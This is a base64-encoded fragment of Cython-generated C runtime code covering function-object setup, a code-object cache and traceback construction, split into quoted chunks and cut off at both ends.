fCBQeV9UUEZMQUdTX0JBU0VUWVBFLAogICAgX19weXhfQ3lGdW5jdGlvblR5cGVfc2xvdHMKfTsKc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSkgewogICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTsKICAgIG1zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYygKICAgICAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSwgbW9kdWxlLCAmX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYywgTlVMTCk7CiAgICBpZiAodW5saWtlbHkobXN0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSA9PSBOVUxMKSkgewogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXREZWZhdWx0cyhQeU9iamVjdCAqZnVuYywgUHlUeXBlT2JqZWN0ICpkZWZhdWx0c190eXBlKSB7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYzsKICAgIG0tPmRlZmF1bHRzID0gUHlPYmplY3RfQ2FsbE9iamVjdCgoUHlPYmplY3QqKWRlZmF1bHRzX3R5cGUsIE5VTEwpOyAvLyBfUHlPYmplY3RfTmV3KGRlZmF1bHRzX3R5cGUpOwogICAgaWYgKHVubGlrZWx5KCFtLT5kZWZhdWx0cykpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gbS0+ZGVmYXVsdHM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzVHVwbGUoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICp0dXBsZSkgewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7CiAgICBtLT5kZWZhdWx0c190dXBsZSA9IHR1cGxlOwogICAgUHlfSU5DUkVGKHR1cGxlKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNLd0RpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpkaWN0KSB7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYzsKICAgIG0tPmRlZmF1bHRzX2t3ZGljdCA9IGRpY3Q7CiAgICBQeV9JTkNSRUYoZGljdCk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAq""ZnVuYywgUHlPYmplY3QgKmRpY3QpIHsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwogICAgbS0+ZnVuY19hbm5vdGF0aW9ucyA9IGRpY3Q7CiAgICBQeV9JTkNSRUYoZGljdCk7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fTmV3KFB5TWV0aG9kRGVmICptbCwgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkgewogICAgUHlPYmplY3QgKm9wID0gX19QeXhfQ3lGdW5jdGlvbl9Jbml0KAogICAgICAgIFB5T2JqZWN0X0dDX05ldyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSksCiAgICAgICAgbWwsIGZsYWdzLCBxdWFsbmFtZSwgY2xvc3VyZSwgbW9kdWxlLCBnbG9iYWxzLCBjb2RlCiAgICApOwogICAgaWYgKGxpa2VseShvcCkpIHsKICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhvcCk7CiAgICB9CiAgICByZXR1cm4gb3A7Cn0KCgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUUKc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpIHsKICAgIFB5T2JqZWN0ICp1c2VfY2xpbmU7CiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBQeU9iamVjdCAqKmN5dGhvbl9ydW50aW1lX2RpY3Q7CiNlbmRpZgogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodHN0YXRlKTsKICAgIGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUpKSB7CiAgICAgICAgcmV0dXJuIGNfbGluZTsKICAgIH0KICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZSh0c3RhdGUsICZwdHlwZSwgJnB2YWx1ZSwgJnB0cmFjZWJhY2spOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBjeXRob25fcnVudGltZV9kaWN0ID0gX1B5T2JqZWN0X0dldERpY3RQdHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUpOwogICAgaWYgKGxpa2VseShjeXRob25fcnVudGltZV9kaWN0KSkgewogICAgICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oKmN5dGhvbl9ydW50aW1lX2RpY3QpOwogICAgICAgIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKAogICAgICAgICAgICB1c2VfY2xpbmUsICpjeXRob25fcnVudGltZV9kaWN0LAogICAgICAgICAgICBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cigqY3l0aG9uX3J1bnRpbWVfZGljdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Ns""aW5lX2luX3RyYWNlYmFjaykpCiAgICAgICAgUHlfWElOQ1JFRih1c2VfY2xpbmUpOwogICAgICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICB9IGVsc2UKI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICp1c2VfY2xpbmVfb2JqID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2spOwogICAgICBpZiAodXNlX2NsaW5lX29iaikgewogICAgICAgIHVzZV9jbGluZSA9IFB5T2JqZWN0X05vdCh1c2VfY2xpbmVfb2JqKSA/IFB5X0ZhbHNlIDogUHlfVHJ1ZTsKICAgICAgICBQeV9JTkNSRUYodXNlX2NsaW5lKTsKICAgICAgICBQeV9ERUNSRUYodXNlX2NsaW5lX29iaik7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB1c2VfY2xpbmUgPSBOVUxMOwogICAgICB9CiAgICB9CiAgICBpZiAoIXVzZV9jbGluZSkgewogICAgICAgIGNfbGluZSA9IDA7CiAgICAgICAgKHZvaWQpIFB5T2JqZWN0X1NldEF0dHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2ssIFB5X0ZhbHNlKTsKICAgIH0KICAgIGVsc2UgaWYgKHVzZV9jbGluZSA9PSBQeV9GYWxzZSB8fCAodXNlX2NsaW5lICE9IFB5X1RydWUgJiYgUHlPYmplY3RfTm90KHVzZV9jbGluZSkgIT0gMCkpIHsKICAgICAgICBjX2xpbmUgPSAwOwogICAgfQogICAgUHlfWERFQ1JFRih1c2VfY2xpbmUpOwogICAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCBwdHlwZSwgcHZhbHVlLCBwdHJhY2ViYWNrKTsKICAgIHJldHVybiBjX2xpbmU7Cn0KI2VuZGlmCgoKc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpIHsKICAgIGludCBzdGFydCA9IDAsIG1pZCA9IDAsIGVuZCA9IGNvdW50IC0gMTsKICAgIGlmIChlbmQgPj0gMCAmJiBjb2RlX2xpbmUgPiBlbnRyaWVzW2VuZF0uY29kZV9saW5lKSB7CiAgICAgICAgcmV0dXJuIGNvdW50OwogICAgfQogICAgd2hpbGUgKHN0YXJ0IDwgZW5kKSB7CiAgICAgICAgbWlkID0gc3RhcnQgKyAoZW5kIC0gc3RhcnQpIC8gMjsKICAgICAgICBpZiAoY29kZV9saW5lIDwgZW50cmllc1ttaWRdLmNvZGVfbGluZSkgewogICAgICAgICAgICBlbmQgPSBtaWQ7CiAgICAgICAgfSBlbHNlIGlmIChjb2RlX2xpbmUgPiBlbnRyaWVzW21pZF0uY29kZV9saW5lKSB7CiAgICAgICAgICAgICBzdGFydCA9IG1pZCArIDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIG1pZDsKICAgICAgICB9CiAgICB9CiAgICBpZiAoY29kZV9saW5lIDw9IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUp""IHsKICAgICAgICByZXR1cm4gbWlkOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gbWlkICsgMTsKICAgIH0KfQpzdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X19maW5kX2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUpIHsKICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdDsKICAgIGludCBwb3M7CiAgICBpZiAodW5saWtlbHkoIWNvZGVfbGluZSkgfHwgdW5saWtlbHkoIWNvZGVfY2FjaGUtPmVudHJpZXMpKSB7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpOwogICAgaWYgKHVubGlrZWx5KHBvcyA+PSBjb2RlX2NhY2hlLT5jb3VudCkgfHwgdW5saWtlbHkoY29kZV9jYWNoZS0+ZW50cmllc1twb3NdLmNvZGVfbGluZSAhPSBjb2RlX2xpbmUpKSB7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBjb2RlX29iamVjdCA9IGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX29iamVjdDsKICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7CiAgICByZXR1cm4gY29kZV9vYmplY3Q7Cn0Kc3RhdGljIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDUwogICAgKHZvaWQpX19weXhfX2ZpbmRfY29kZV9vYmplY3Q7CiAgICByZXR1cm4gTlVMTDsgLy8gTW9zdCBpbXBsZW1lbnRhdGlvbiBzaG91bGQgaGF2ZSBhdG9taWNzLiBCdXQgb3RoZXJ3aXNlLCBkb24ndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IG1pc3MuCiNlbHNlCiAgICBzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlICpjb2RlX2NhY2hlID0gJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVfY2FjaGU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZF9jb3VudCA9IF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTsKICAgIGlmIChvbGRfY291bnQgPCAwKSB7CiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZW5kaWYKICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpyZXN1bHQgPSBfX3B5eF9fZmluZF9jb2RlX29iamVjdChjb2RlX2NhY2hlLCBjb2RlX2xpbmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vz""c29yX2NvdW50KTsKI2VuZGlmCiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQpzdGF0aWMgdm9pZCBfX3B5eF9faW5zZXJ0X2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCkKewogICAgaW50IHBvcywgaTsKICAgIF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzID0gY29kZV9jYWNoZS0+ZW50cmllczsKICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHsKICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9NYWxsb2MoNjQqc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7CiAgICAgICAgaWYgKGxpa2VseShlbnRyaWVzKSkgewogICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllczsKICAgICAgICAgICAgY29kZV9jYWNoZS0+bWF4X2NvdW50ID0gNjQ7CiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmNvdW50ID0gMTsKICAgICAgICAgICAgZW50cmllc1swXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7CiAgICAgICAgICAgIGVudHJpZXNbMF0uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgICAgICAgICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgcG9zID0gX19weXhfYmlzZWN0X2NvZGVfb2JqZWN0cyhjb2RlX2NhY2hlLT5lbnRyaWVzLCBjb2RlX2NhY2hlLT5jb3VudCwgY29kZV9saW5lKTsKICAgIGlmICgocG9zIDwgY29kZV9jYWNoZS0+Y291bnQpICYmIHVubGlrZWx5KGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPT0gY29kZV9saW5lKSkgewogICAgICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiB0bXAgPSBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3Q7CiAgICAgICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7CiAgICAgICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTsKICAgICAgICBQeV9ERUNSRUYodG1wKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBpZiAoY29kZV9jYWNoZS0+Y291bnQgPT0gY29kZV9jYWNoZS0+bWF4X2NvdW50KSB7CiAgICAgICAgaW50IG5ld19tYXggPSBjb2RlX2NhY2hlLT5tYXhfY291bnQgKyA2NDsKICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9SZWFsbG9jKAogICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzLCAoKHNpemVfdCluZXdfbWF4KSAqIHNpemVvZihfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSkpOwogICAgICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllczsK""ICAgICAgICBjb2RlX2NhY2hlLT5tYXhfY291bnQgPSBuZXdfbWF4OwogICAgfQogICAgZm9yIChpPWNvZGVfY2FjaGUtPmNvdW50OyBpPnBvczsgaS0tKSB7CiAgICAgICAgZW50cmllc1tpXSA9IGVudHJpZXNbaS0xXTsKICAgIH0KICAgIGVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7CiAgICBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgIGNvZGVfY2FjaGUtPmNvdW50Kys7CiAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpOwp9CnN0YXRpYyB2b2lkIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChpbnQgY29kZV9saW5lLCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3QpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDUwogICAgKHZvaWQpX19weXhfX2luc2VydF9jb2RlX29iamVjdDsKICAgIHJldHVybjsgLy8gTW9zdCBpbXBsZW1lbnRhdGlvbiBzaG91bGQgaGF2ZSBhdG9taWNzLiBCdXQgb3RoZXJ3aXNlLCBkb24ndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IGZhaWwuCiNlbHNlCiAgICBzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlICpjb2RlX2NhY2hlID0gJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVfY2FjaGU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDsKICAgIGlmICghX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50LCAmZXhwZWN0ZWQsIElOVF9NSU4pKSB7CiAgICAgICAgcmV0dXJuOwogICAgfQojZW5kaWYKICAgIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lLCBjb2RlX29iamVjdCk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfYXRvbWljX3N1YigmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQsIElOVF9NSU4pOwojZW5kaWYKI2VuZGlmCn0KCgojaW5jbHVkZSAiY29tcGlsZS5oIgojaW5jbHVkZSAiZnJhbWVvYmplY3QuaCIKI2luY2x1ZGUgInRyYWNlYmFjay5oIgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDBhNiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAhZGVmaW5lZChQWVBZX1ZFUlNJT04pCiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFCiAgICAjZGVmaW5lIFB5X0JVSUxEX0NPUkUgMQogICNlbmRpZgogICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCIKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKnNjcmF0Y2hfZGljdCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg""ICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmaXJzdGxpbmVubywgUHlPYmplY3QgKm5hbWUpIHsKICAgIFB5T2JqZWN0ICpyZXBsYWNlID0gTlVMTDsKICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19maXJzdGxpbmVubyIsIGZpcnN0bGluZW5vKSkpIHJldHVybiBOVUxMOwogICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKHNjcmF0Y2hfZGljdCwgImNvX25hbWUiLCBuYW1lKSkpIHJldHVybiBOVUxMOwogICAgcmVwbGFjZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoY29kZSwgInJlcGxhY2UiKTsKICAgIGlmIChsaWtlbHkocmVwbGFjZSkpIHsKICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChyZXBsYWNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgc2NyYXRjaF9kaWN0KTsKICAgICAgICBQeV9ERUNSRUYocmVwbGFjZSk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIFB5RXJyX0NsZWFyKCk7CiAgICByZXR1cm4gTlVMTDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9BZGRUcmFjZWJhY2soY29uc3QgY2hhciAqZnVuY25hbWUsIGludCBjX2xpbmUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHsKICAgIFB5T2JqZWN0ICpjb2RlX29iamVjdCA9IE5VTEwsICpweV9weV9saW5lID0gTlVMTCwgKnB5X2Z1bmNuYW1lID0gTlVMTCwgKmRpY3QgPSBOVUxMOwogICAgUHlPYmplY3QgKnJlcGxhY2UgPSBOVUxMLCAqZ2V0ZnJhbWUgPSBOVUxMLCAqZnJhbWUgPSBOVUxMOwogICAgUHlPYmplY3QgKmV4Y190eXBlLCAqZXhjX3ZhbHVlLCAqZXhjX3RyYWNlYmFjazsKICAgIGludCBzdWNjZXNzID0gMDsKICAgIGlmIChjX2xpbmUpIHsKICAgICAgICAodm9pZCkgX19weXhfY2ZpbGVubTsKICAgICAgICAodm9pZCkgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCBjX2xpbmUpOwogICAgfQogICAgUHlFcnJfRmV0Y2goJmV4Y190eXBlLCAmZXhjX3ZhbHVlLCAmZXhjX3RyYWNlYmFjayk7CiAgICBjb2RlX29iamVjdCA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpOwogICAgaWYgKCFjb2RlX29iamVjdCkgewogICAgICAgIGNvZGVfb2JqZWN0ID0gUHlfQ29tcGlsZVN0cmluZygiX2dldGZyYW1lKCkiLCBmaWxlbmFtZSwgUHlfZXZhbF9pbnB1dCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkOwogICAgICAgIHB5X3B5X2xpbmUgPSBQeUxvbmdfRnJvbUxvbmcocHlfbGluZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9weV9saW5lKSkgZ290byBiYWQ7CiAgICAgICAgcHlfZnVuY25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhmdW5jbmFtZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9mdW5j""bmFtZSkpIGdvdG8gYmFkOwogICAgICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFkaWN0KSkgZ290byBiYWQ7CiAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqb2xkX2NvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7CiAgICAgICAgICAgIGNvZGVfb2JqZWN0ID0gX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhjb2RlX29iamVjdCwgZGljdCwgcHlfcHlfbGluZSwgcHlfZnVuY25hbWUpOwogICAgICAgICAgICBQeV9ERUNSRUYob2xkX2NvZGVfb2JqZWN0KTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX29iamVjdCkpIGdvdG8gYmFkOwogICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgY29kZV9vYmplY3QpOwogICAgfSBlbHNlIHsKICAgICAgICBkaWN0ID0gUHlEaWN0X05ldygpOwogICAgfQogICAgZ2V0ZnJhbWUgPSBQeVN5c19HZXRPYmplY3QoIl9nZXRmcmFtZSIpOwogICAgaWYgKHVubGlrZWx5KCFnZXRmcmFtZSkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtU3RyaW5nKGRpY3QsICJfZ2V0ZnJhbWUiLCBnZXRmcmFtZSkpKSBnb3RvIGJhZDsKICAgIGZyYW1lID0gUHlFdmFsX0V2YWxDb2RlKGNvZGVfb2JqZWN0LCBkaWN0LCBkaWN0KTsKICAgIGlmICh1bmxpa2VseSghZnJhbWUpIHx8IGZyYW1lID09IFB5X05vbmUpIGdvdG8gYmFkOwogICAgc3VjY2VzcyA9IDE7CiAgYmFkOgogICAgUHlFcnJfUmVzdG9yZShleGNfdHlwZSwgZXhjX3ZhbHVlLCBleGNfdHJhY2ViYWNrKTsKICAgIFB5X1hERUNSRUYoY29kZV9vYmplY3QpOwogICAgUHlfWERFQ1JFRihweV9weV9saW5lKTsKICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpOwogICAgUHlfWERFQ1JFRihkaWN0KTsKICAgIFB5X1hERUNSRUYocmVwbGFjZSk7CiAgICBpZiAoc3VjY2VzcykgewogICAgICAgIFB5VHJhY2VCYWNrX0hlcmUoCiAgICAgICAgICAgIChzdHJ1Y3QgX2ZyYW1lKilmcmFtZSk7CiAgICB9CiAgICBQeV9YREVDUkVGKGZyYW1lKTsKfQojZWxzZQpzdGF0aWMgUHlDb2RlT2JqZWN0KiBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0Rm9yVHJhY2ViYWNrKAogICAgICAgICAgICBjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKSB7CiAgICBQeUNvZGVPYmplY3QgKnB5X2NvZGUgPSBOVUxMOwogICAgUHlPYmplY3QgKnB5X2Z1bmNuYW1lID0gTlVMTDsKICAgIGlmIChjX2xpbmUpIHsKICAgICAgICBweV9mdW5jbmFtZSA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCAiJXMgKCVzOiVkKSIsIGZ1bmNuYW1lLCBfX3B5eF9jZmlsZW5tLCBjX2xpbmUpOwogICAgICAgIGlmICghcHlfZnVuY25hbWUpIGdvdG8gYmFkOwogICAgICAgIGZ1bmNuYW1lID0gUHlVbmljb2RlX0FzVVRGOChweV9mdW5jbmFtZSk7CiAgICAg""ICAgaWYgKCFmdW5jbmFtZSkgZ290byBiYWQ7CiAgICB9CiAgICBweV9jb2RlID0gUHlDb2RlX05ld0VtcHR5KGZpbGVuYW1lLCBmdW5jbmFtZSwgcHlfbGluZSk7CiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTsKICAgIHJldHVybiBweV9jb2RlOwpiYWQ6CiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkgewogICAgUHlDb2RlT2JqZWN0ICpweV9jb2RlID0gMDsKICAgI